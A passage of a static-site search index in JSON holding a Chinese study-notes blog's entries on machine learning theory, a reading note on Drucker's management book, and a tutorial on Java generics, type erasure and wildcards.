\u53ef\u5b66\u6027"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#41","text":"","title":"4.1. \u57fa\u672c\u6982\u5ff5"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#411","text":"\u72ec\u7acb\u540c\u5206\u5e03\uff08iid\uff0cindependently identically distribution\uff09 \u5728\u6982\u7387\u7edf\u8ba1\u7406\u8bba\u4e2d\uff0c\u6307\u968f\u673a\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u4f55\u65f6\u523b\u7684\u53d6\u503c\u90fd\u4e3a\u968f\u673a\u53d8\u91cf\uff0c\u5982\u679c\u8fd9\u4e9b\u968f\u673a\u53d8\u91cf\u670d\u4ece\u540c\u4e00\u5206\u5e03\uff0c\u5e76\u4e14\u4e92\u76f8\u72ec\u7acb\uff0c\u90a3\u4e48\u8fd9\u4e9b\u968f\u673a\u53d8\u91cf\u662f\u72ec\u7acb\u540c\u5206\u5e03\u3002","title":"4.1.1. \u72ec\u7acb\u540c\u5206\u5e03"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#412","text":"","title":"4.1.2. \u6cdb\u5316\u8bef\u5dee"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#413","text":"","title":"4.1.3. \u7ecf\u9a8c\u8bef\u5dee"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#414","text":"","title":"4.1.4. \u8bef\u5dee\u53c2\u6570"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#415","text":"","title":"4.1.5. \u4e0d\u5408"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#416","text":"","title":"4.1.6. \u6982\u5ff5\u4e0e\u6982\u5ff5\u7c7b"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#417","text":"","title":"4.1.7. \u5047\u8bbe\u7a7a\u95f4"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#418","text":"","title":"4.1.8. \u53ef\u5206\u4e0e\u4e0d\u53ef\u5206"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#42-pac","text":"","title":"4.2. PAC\u5b66\u4e60"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#43","text":"\u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.3. \u5206\u6790\u5b9e\u4f8b"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%AE%A1%E7%90%86%E5%AD%A6/1.%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E8%B7%B5/","text":"\u6570\u5b66\u5973\u5b69 # \u76ee\u5f55 # \u6570\u5b66\u5973\u5b69 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 1. \u80cc\u666f # \u6700\u8fd1\u6211\u53c2\u52a0\u4e86\u5b66\u5802\u5728\u7ebf\u4e3e\u529e\u7684\u7ba1\u7406\u591c\u8bfb\u6d3b\u52a8\uff0c\u7b2c\u4e00\u672c\u4e66\u662f\u5f7c\u5f97\u00b7\u5fb7\u9c81\u514b\u7684\u300a\u7ba1\u7406\u7684\u5b9e\u8df5\u300b\u3002\u5f7c\u5f97\u00b7\u5fb7\u9c81\u514b\u88ab\u79f0\u4e3a\u73b0\u4ee3\u7ba1\u7406\u5b66\u4e4b\u7236\uff0c\u5176\u601d\u60f3\u4e0e\u8457\u4f5c\u5f71\u54cd\u4e86\u8bb8\u591a\u5b66\u8005\u548c\u4f01\u4e1a\u5bb6\u4eec\u3002\u4e8e\u662f\u6211\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u8bb0\u5f55\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\u3002 2. \u6982\u8ff0 #","title":"1.\u7ba1\u7406\u7684\u5b9e\u8df5"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%AE%A1%E7%90%86%E5%AD%A6/1.%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E8%B7%B5/#_1","text":"","title":"\u6570\u5b66\u5973\u5b69"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%AE%A1%E7%90%86%E5%AD%A6/1.%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E8%B7%B5/#_2","text":"\u6570\u5b66\u5973\u5b69 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0","title":"\u76ee\u5f55"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%AE%A1%E7%90%86%E5%AD%A6/1.%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E8%B7%B5/#1","text":"\u6700\u8fd1\u6211\u53c2\u52a0\u4e86\u5b66\u5802\u5728\u7ebf\u4e3e\u529e\u7684\u7ba1\u7406\u591c\u8bfb\u6d3b\u52a8\uff0c\u7b2c\u4e00\u672c\u4e66\u662f\u5f7c\u5f97\u00b7\u5fb7\u9c81\u514b\u7684\u300a\u7ba1\u7406\u7684\u5b9e\u8df5\u300b\u3002\u5f7c\u5f97\u00b7\u5fb7\u9c81\u514b\u88ab\u79f0\u4e3a\u73b0\u4ee3\u7ba1\u7406\u5b66\u4e4b\u7236\uff0c\u5176\u601d\u60f3\u4e0e\u8457\u4f5c\u5f71\u54cd\u4e86\u8bb8\u591a\u5b66\u8005\u548c\u4f01\u4e1a\u5bb6\u4eec\u3002\u4e8e\u662f\u6211\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u8bb0\u5f55\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%AE%A1%E7%90%86%E5%AD%A6/1.%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E8%B7%B5/#2","text":"","title":"2. \u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/","text":"Java\u4e2d\u7684\u6cdb\u578b # \u76ee\u5f55 # Java\u4e2d\u7684\u6cdb\u578b \u76ee\u5f55 1. \u80cc\u666f 2. \u6cdb\u578b 2.1. \u57fa\u672c\u6982\u5ff5\u548c\u539f\u7406 2.1.1. \u4e00\u4e2a\u7b80\u5355\u6cdb\u578b\u7c7b 2.1.2. \u5c0f\u7ed3 2.2. \u901a\u914d\u7b26 2.2.1. \u66f4\u7b80\u6d01\u7684\u53c2\u6570\u7c7b\u578b\u9650\u5b9a 2.2.2. \u7406\u89e3\u901a\u914d\u7b26 2.2.3. \u8d85\u7c7b\u578b\u901a\u914d\u7b26 2.2.4. \u901a\u914d\u7b26\u6bd4\u8f83 2.3. \u7ec6\u8282\u548c\u5c40\u9650\u6027 3. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u4e0a\u4e86\u300a\u5206\u5e03\u5f0f\u7cfb\u7edf\u300b\u8bfe\u7a0b\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u57fa\u4e8eJava\u5b9e\u73b0\u5206\u5e03\u5f0f\u8ba1\u7b97\uff0c\u6240\u4ee5\u8001\u5e08\u524d\u51e0\u8282\u8bfe\u4e3b\u8981\u5728\u7ed9\u6211\u4eec\u8bb2\u7528Java\u505a\u5206\u5e03\u5f0f\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u6211\u5c06\u8001\u5e08\u8bb2\u7684\u5185\u5bb9\u7ed3\u5408\u4e66\u7c4d\u505a\u4e86\u4e00\u4e9b\u6574\u7406\uff0c\u8fd9\u4e00\u7bc7\u4e3b\u8981\u8ba8\u8bba\u6cdb\u578b\u3002 2. \u6cdb\u578b # \u6b64\u90e8\u5206\u5185\u5bb9\u4e3b\u8981\u53c2\u8003\u81ea \u300aJava\u7f16\u7a0b\u7684\u903b\u8f91\u300b \u7b2c8\u7ae0 1 \u3002 2.1. \u57fa\u672c\u6982\u5ff5\u548c\u539f\u7406 # \u5728\u5b9e\u9645\u7f16\u7a0b\u8fc7\u7a0b\u4e2d\uff0c\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5173\u5fc3\u7684\u4e0d\u662f\u7c7b\u578b\uff0c\u800c\u662f\u80fd\u529b\uff0c\u9488\u5bf9\u63a5\u53e3\u548c\u80fd\u529b\u7f16\u7a0b\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u590d\u7528\u4ee3\u7801\uff0c\u8fd8\u53ef\u4ee5\u964d\u4f4e\u8026\u5408\uff0c\u63d0\u9ad8\u7075\u6d3b\u6027\u3002 \u6cdb\u578b\u5c06\u63a5\u53e3\u7684\u6982\u5ff5\u8fdb\u4e00\u6b65\u5ef6\u4f38\uff0c\u201c\u6cdb\u578b\u201d\u7684\u5b57\u9762\u610f\u601d\u5c31\u662f\u5e7f\u6cdb\u7684\u7c7b\u578b\u3002\u7c7b\u3001\u63a5\u53e3\u548c\u65b9\u6cd5\u4ee3\u7801\u53ef\u4ee5\u5e94\u7528\u4e8e\u975e\u5e38\u5e7f\u6cdb\u7684\u7c7b\u578b\uff0c\u4ee3\u7801\u4e0e\u5b83\u4eec\u80fd\u591f\u64cd\u4f5c\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u518d\u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u540c\u4e00\u5957\u4ee3\u7801\u53ef\u4ee5\u7528\u4e8e\u591a\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u8fd9\u6837\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u590d\u7528\u4ee3\u7801\uff0c\u964d\u4f4e\u8026\u5408\uff0c\u800c\u4e14\u53ef\u4ee5\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u548c\u5b89\u5168\u6027\u3002 \u8fd9\u4e48\u8bf4\u53ef\u80fd\u6bd4\u8f83\u62bd\u8c61\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e9b\u4f8b\u5b50\u9010\u6b65\u8fdb\u884c\u8bf4\u660e\u3002\u5728 Java \u4e2d\uff0c\u7c7b\u3001\u63a5\u53e3\u3001\u65b9\u6cd5\u90fd\u53ef\u4ee5\u662f\u6cdb\u578b\u7684\uff0c\u6211\u4eec\u5148\u6765\u770b\u6cdb\u578b\u7c7b\u3002 2.1.1. \u4e00\u4e2a\u7b80\u5355\u6cdb\u578b\u7c7b # \u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u6cdb\u578b\u7c7b\u7684\u57fa\u672c\u6982\u5ff5\u3001\u57fa\u672c\u539f\u7406\u548c\u6cdb\u578b\u7684\u597d\u5904\u3002 \u57fa\u672c\u6982\u5ff5 \u6211\u4eec\u76f4\u63a5\u6765\u770b\u4ee3\u7801\uff1a public class Pair<T> { T first; T second; public Pair(T first, T second){ this.first = first; this.second = second; } public T getFirst() { return first; } public T getSecond() { return second; } } Pair \u5c31\u662f\u4e00\u4e2a\u6cdb\u578b\u7c7b\uff0c\u4e0e\u666e\u901a\u7c7b\u7684\u533a\u522b\u4f53\u73b0\u5728\uff1a \u7c7b\u540d\u540e\u9762\u591a\u4e86\u4e00\u4e2a <T> \uff1b first \u548c second \u7684\u7c7b\u578b\u90fd\u662f T \u3002 T \u662f\u4ec0\u4e48\u5462\uff1f T \u8868\u793a\u7c7b\u578b\u53c2\u6570\uff0c\u6cdb\u578b\u5c31\u662f\u7c7b\u578b\u53c2\u6570\u5316\uff0c\u5904\u7406\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u662f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u3002\u600e\u4e48\u7528\u8fd9\u4e2a\u6cdb\u578b\u7c7b\uff0c\u5e76\u4f20\u9012\u7c7b\u578b\u53c2\u6570\u5462\uff1f\u770b\u4ee3\u7801\uff1a Pair<Integer> minmax = new Pair<Integer>(1,100); Integer min = minmax.getFirst(); Integer max = minmax.getSecond(); Pair<Integer> \u4e2d\u7684 Integer \u5c31\u662f\u4f20\u9012\u7684\u5b9e\u9645\u7c7b\u578b\u53c2\u6570\u3002 Pair \u7c7b\u7684\u4ee3\u7801\u548c\u5b83\u5904\u7406\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u662f\u7ed1\u5b9a\u7684\uff0c\u5177\u4f53\u7c7b\u578b\u53ef\u4ee5\u53d8\u5316\u3002\u4e0a\u9762\u662f Integer \uff0c\u4e5f\u53ef\u4ee5\u662f String \uff0c\u6bd4\u5982\uff1a Pair<String> kv = new Pair<String>(\"name\",\"\u8001\u9a6c\"); \u7c7b\u578b\u53c2\u6570\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c Pair \u7c7b\u4e2d\u7684 first \u548c second \u53ef\u4ee5\u662f\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u591a\u4e2a\u7c7b\u578b\u4e4b\u95f4\u4ee5\u9017\u53f7\u5206\u9694\uff0c\u6765\u770b\u6539\u8fdb\u540e\u7684 Pair \u7c7b\u5b9a\u4e49\uff1a public class Pair<U, V> { U first; V second; public Pair(U first, V second){ this.first = first; this.second = second; } public U getFirst() { return first; } public V getSecond() { return second; } } \u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\uff1a Pair<String,Integer> pair = new Pair<String,Integer>(\"\u8001\u9a6c\",100); <String\uff0cInteger> \u65e2\u51fa\u73b0\u5728\u4e86\u58f0\u660e\u53d8\u91cf\u65f6\uff0c\u4e5f\u51fa\u73b0\u5728\u4e86 new \u540e\u9762\uff0c\u6bd4\u8f83\u70e6\u7410\uff0c\u4ece Java 7 \u5f00\u59cb\uff0c\u652f\u6301\u7701\u7565\u540e\u9762\u7684\u7c7b\u578b\u53c2\u6570\uff0c\u53ef\u4ee5\u5982\u4e0b\u4f7f\u7528\uff1a Pair<String,Integer> pair = new Pair<>(\"\u8001\u9a6c\",100); \u57fa\u672c\u539f\u7406 \u6cdb\u578b\u7c7b\u578b\u53c2\u6570\u5230\u5e95\u662f\u4ec0\u4e48\u5462\uff1f\u4e3a\u4ec0\u4e48\u4e00\u5b9a\u8981\u5b9a\u4e49\u7c7b\u578b\u53c2\u6570\u5462\uff1f\u5b9a\u4e49\u666e\u901a\u7c7b\uff0c\u76f4\u63a5\u4f7f\u7528 Object \u4e0d\u5c31\u884c\u4e86\u5417\uff1f\u6bd4\u5982\uff0c Pair \u7c7b\u53ef\u4ee5\u5199\u4e3a\uff1a public class Pair { Object first; Object second; public Pair(Object first, Object second){ this.first = first; this.second = second; } public Object getFirst() { return first; } public Object getSecond() { return second; } } \u4f7f\u7528 Pair \u7684\u4ee3\u7801\u53ef\u4ee5\u4e3a\uff1a Pair minmax = new Pair(1,100); Integer min = (Integer)minmax.getFirst(); Integer max = (Integer)minmax.getSecond(); Pair kv = new Pair(\"name\",\"\u8001\u9a6c\"); String key = (String)kv.getFirst(); String value = (String)kv.getSecond(); \u8fd9\u6837\u662f\u53ef\u4ee5\u7684\u3002\u5b9e\u9645\u4e0a\uff0c Java \u6cdb\u578b\u7684\u5185\u90e8\u539f\u7406\u5c31\u662f\u8fd9\u6837\u7684\u3002 \u6211\u4eec\u77e5\u9053\uff0c Java \u6709 Java \u7f16\u8bd1\u5668\u548c Java \u865a\u62df\u673a\uff0c\u7f16\u8bd1\u5668\u5c06 Java \u6e90\u4ee3\u7801\u8f6c\u6362\u4e3a .class \u6587\u4ef6\uff0c\u865a\u62df\u673a\u52a0\u8f7d\u5e76\u8fd0\u884c .class \u6587\u4ef6\u3002\u5bf9\u4e8e\u6cdb\u578b\u7c7b\uff0c Java \u7f16\u8bd1\u5668\u4f1a\u5c06\u6cdb\u578b\u4ee3\u7801\u8f6c\u6362\u4e3a\u666e\u901a\u7684\u975e\u6cdb\u578b\u4ee3\u7801\uff0c\u5c31\u50cf\u4e0a\u9762\u7684\u666e\u901a Pair \u7c7b\u4ee3\u7801\u53ca\u5176\u4f7f\u7528\u4ee3\u7801\u4e00\u6837\uff0c\u5c06\u7c7b\u578b\u53c2\u6570T\u64e6\u9664\uff0c\u66ff\u6362\u4e3a Object \uff0c\u63d2\u5165\u5fc5\u8981\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u3002 Java \u865a\u62df\u673a\u5b9e\u9645\u6267\u884c\u7684\u65f6\u5019\uff0c\u5b83\u662f\u4e0d\u77e5\u9053\u6cdb\u578b\u8fd9\u56de\u4e8b\u7684\uff0c\u53ea\u77e5\u9053\u666e\u901a\u7684\u7c7b\u53ca\u4ee3\u7801\u3002 \u518d\u5f3a\u8c03\u4e00\u4e0b\uff0c Java \u6cdb\u578b\u662f\u901a\u8fc7\u64e6\u9664\u5b9e\u73b0\u7684\uff0c\u7c7b\u5b9a\u4e49\u4e2d\u7684\u7c7b\u578b\u53c2\u6570\u5982T\u4f1a\u88ab\u66ff\u6362\u4e3a Object \uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u77e5\u9053\u6cdb\u578b\u7684\u5b9e\u9645\u7c7b\u578b\u53c2\u6570\uff0c\u6bd4\u5982 Pair<Integer> \uff0c\u8fd0\u884c\u4e2d\u53ea\u77e5\u9053 Pair \uff0c\u800c\u4e0d\u77e5\u9053 Integer \u3002\u8ba4\u8bc6\u5230\u8fd9\u4e00\u70b9\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u5b83\u6709\u52a9\u4e8e\u6211\u4eec\u7406\u89e3 Java \u6cdb\u578b\u7684\u5f88\u591a\u9650\u5236\u3002 Java\u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u8bbe\u8ba1\u5462\uff1f\u6cdb\u578b\u662fJava 5\u4ee5\u540e\u624d\u652f\u6301\u7684\uff0c\u8fd9\u4e48\u8bbe\u8ba1\u662f\u4e3a\u4e86\u517c\u5bb9\u6027\u800c\u4e0d\u5f97\u5df2\u7684\u4e00\u4e2a\u9009\u62e9\u3002 \u6cdb\u578b\u7684\u597d\u5904 \u65e2\u7136\u53ea\u4f7f\u7528\u666e\u901a\u7c7b\u548c Object \u5c31\u53ef\u4ee5\uff0c\u800c\u4e14\u6cdb\u578b\u6700\u540e\u4e5f\u8f6c\u6362\u4e3a\u4e86\u666e\u901a\u7c7b\uff0c\u90a3\u4e3a\u4ec0\u4e48\u8fd8\u8981\u7528\u6cdb\u578b\u5462\uff1f\u6216\u8005\u8bf4\uff0c\u6cdb\u578b\u5230\u5e95\u6709\u4ec0\u4e48\u597d\u5904\u5462\uff1f\u6cdb\u578b\u4e3b\u8981\u6709\u4e24\u4e2a\u597d\u5904\uff1a \u66f4\u597d\u7684\u5b89\u5168\u6027\u3002 \u66f4\u597d\u7684\u53ef\u8bfb\u6027\u3002 \u8bed\u8a00\u548c\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u4e00\u4e2a\u91cd\u8981\u76ee\u6807\u662f\u5c06bug\u5c3d\u91cf\u6d88\u706d\u5728\u6447\u7bee\u91cc\uff0c\u80fd\u6d88\u706d\u5728\u5199\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5c31\u4e0d\u8981\u7b49\u5230\u4ee3\u7801\u5199\u5b8c\u7a0b\u5e8f\u8fd0\u884c\u7684\u65f6\u5019\u3002\u53ea\u4f7f\u7528 Object \uff0c\u4ee3\u7801\u5199\u9519\u7684\u65f6\u5019\uff0c\u5f00\u53d1\u73af\u5883\u548c\u7f16\u8bd1\u5668\u4e0d\u80fd\u5e2e\u6211\u4eec\u53d1\u73b0\u95ee\u9898\uff0c\u770b\u4ee3\u7801\uff1a Pair pair = new Pair(\"\u8001\u9a6c\",1); Integer id = (Integer)pair.getFirst(); String name = (String)pair.getSecond(); \u770b\u51fa\u95ee\u9898\u4e86\u5417\uff1f\u5199\u4ee3\u7801\u65f6\u4e0d\u5c0f\u5fc3\u628a\u7c7b\u578b\u5f04\u9519\u4e86\uff0c\u4e0d\u8fc7\uff0c\u4ee3\u7801\u7f16\u8bd1\u65f6\u662f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u7684\uff0c\u4f46\u8fd0\u884c\u65f6\u7a0b\u5e8f\u629b\u51fa\u4e86\u7c7b\u578b\u8f6c\u6362\u5f02\u5e38 ClassCastException \u3002\u5982\u679c\u4f7f\u7528\u6cdb\u578b\uff0c\u5219\u4e0d\u53ef\u80fd\u72af\u8fd9\u4e2a\u9519\u8bef\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a Pair<String,Integer> pair = new Pair<>(\"\u8001\u9a6c\",1); Integer id = pair.getFirst(); //\u6709\u7f16\u8bd1\u9519\u8bef String name = pair.getSecond(); //\u6709\u7f16\u8bd1\u9519\u8bef \u5f00\u53d1\u73af\u5883\uff08\u5982 Eclipse \uff09\u4f1a\u63d0\u793a \u7c7b\u578b\u9519\u8bef \uff0c\u5373\u4f7f\u6ca1\u6709\u597d\u7684\u5f00\u53d1\u73af\u5883\uff0c\u7f16\u8bd1\u65f6 Java \u7f16\u8bd1\u5668\u4e5f\u4f1a\u63d0\u793a\u3002\u8fd9\u79f0\u4e4b\u4e3a\u7c7b\u578b\u5b89\u5168\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u901a\u8fc7\u4f7f\u7528\u6cdb\u578b\uff0c\u5f00\u53d1\u73af\u5883\u548c\u7f16\u8bd1\u5668\u80fd\u786e\u4fdd\u4e0d\u4f1a\u7528\u9519\u7c7b\u578b\uff0c\u4e3a\u7a0b\u5e8f\u591a\u8bbe\u7f6e\u4e00\u9053\u5b89\u5168\u9632\u62a4\u7f51\u3002\u4f7f\u7528\u6cdb\u578b\uff0c\u8fd8\u53ef\u4ee5\u7701\u53bb\u70e6\u7410\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u518d\u52a0\u4e0a\u660e\u786e\u7684\u7c7b\u578b\u4fe1\u606f\uff0c\u4ee3\u7801\u53ef\u8bfb\u6027\u4e5f\u4f1a\u66f4\u597d\u3002 2.1.2. \u5c0f\u7ed3 # \u6cdb\u578b\u662f\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u91cd\u8981\u7684\u601d\u7ef4\u65b9\u5f0f\uff0c\u5b83 \u5c06\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\u4e0e\u6570\u636e\u7c7b\u578b\u76f8\u5206\u79bb \uff0c\u4f7f\u5f97\u540c\u4e00\u5957\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\u80fd\u591f\u5e94\u7528\u4e8e\u5404\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u8bc1 \u7c7b\u578b\u5b89\u5168 \uff0c \u63d0\u9ad8\u53ef\u8bfb\u6027 \u3002 2.2. \u901a\u914d\u7b26 # \u672c\u8282\u4e3b\u8981\u8ba8\u8bba\u6cdb\u578b\u4e2d\u7684\u901a\u914d\u7b26\u6982\u5ff5\u3002\u901a\u914d\u7b26\u6709\u7740\u4ee4\u4eba\u8d39\u89e3\u548c\u6df7\u6dc6\u7684\u8bed\u6cd5\uff0c\u4f46\u901a\u914d\u7b26\u5927\u91cf\u5e94\u7528\u4e8e Java \u5bb9\u5668\u7c7b\u4e2d\uff0c\u5b83\u5230\u5e95\u662f\u4ec0\u4e48\uff1f\u4e0b\u9762\u6211\u4eec\u9010\u6b65\u6765\u89e3\u6790\u3002 2.2.1. \u66f4\u7b80\u6d01\u7684\u53c2\u6570\u7c7b\u578b\u9650\u5b9a # \u6211\u4eec\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4e3a\u4e86\u5c06 Integer \u5bf9\u8c61\u6dfb\u52a0\u5230 Number \u5bb9\u5668\u4e2d\uff0c\u6211\u4eec\u7684\u7c7b\u578b\u53c2\u6570\u4f7f\u7528\u4e86\u5176\u4ed6\u7c7b\u578b\u53c2\u6570\u4f5c\u4e3a\u4e0a\u754c\uff0c\u8fd9\u79cd\u5199\u6cd5\u6709\u70b9\u70e6\u7410\uff0c\u5b83\u53ef\u4ee5\u66ff\u6362\u4e3a\u66f4\u4e3a\u7b80\u6d01\u7684\u901a\u914d\u7b26\u5f62\u5f0f\uff1a // \u4e0d\u4f7f\u7528\u901a\u914d\u7b26\u7684\u4f8b\u5b50 public <T extends E> void addAll(DynamicArray<T> c) { for(int i=0; i<c.size; i++){ add(c.get(i)); } } // \u901a\u914d\u7b26\u5f62\u5f0f public void addAll(DynamicArray<? extends E> c) { for(int i=0; i<c.size; i++){ add(c.get(i)); } } \u8fd9\u4e2a\u65b9\u6cd5\u6ca1\u6709\u5b9a\u4e49\u7c7b\u578b\u53c2\u6570\uff0c c \u7684\u7c7b\u578b\u662f DynamicArray<\uff1fextends E> \uff0c \uff1f \u8868\u793a\u901a\u914d\u7b26\uff0c <\uff1fextends E> \u8868\u793a\u6709\u9650\u5b9a\u901a\u914d\u7b26\uff0c\u5339\u914d E \u6216 E \u7684\u67d0\u4e2a\u5b50\u7c7b\u578b\uff0c\u5177\u4f53\u4ec0\u4e48\u5b50\u7c7b\u578b\u662f\u672a\u77e5\u7684\u3002\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u4ee3\u7801\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u6539\u52a8\uff0c\u8fd8\u53ef\u4ee5\u662f\uff1a DynamicArray<Number> numbers = new DynamicArray<>(); DynamicArray<Integer> ints = new DynamicArray<>(); ints.add(100); ints.add(34); numbers.addAll(ints); \u8fd9\u91cc\uff0c E \u662f Number \u7c7b\u578b\uff0c DynamicArray<\uff1fextends E> \u53ef\u4ee5\u5339\u914d DynamicArray<Integer> \u3002 \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u540c\u6837\u662f extends \u5173\u952e\u5b57\uff0c\u540c\u6837\u5e94\u7528\u4e8e\u6cdb\u578b\uff0c <T extends E> \u548c <\uff1fextends E> \u5230\u5e95\u6709\u4ec0\u4e48\u5173\u7cfb\uff1f\u5b83\u4eec\u7528\u7684\u5730\u65b9\u4e0d\u4e00\u6837\uff0c\u6211\u4eec\u89e3\u91ca\u4e00\u4e0b\uff1a 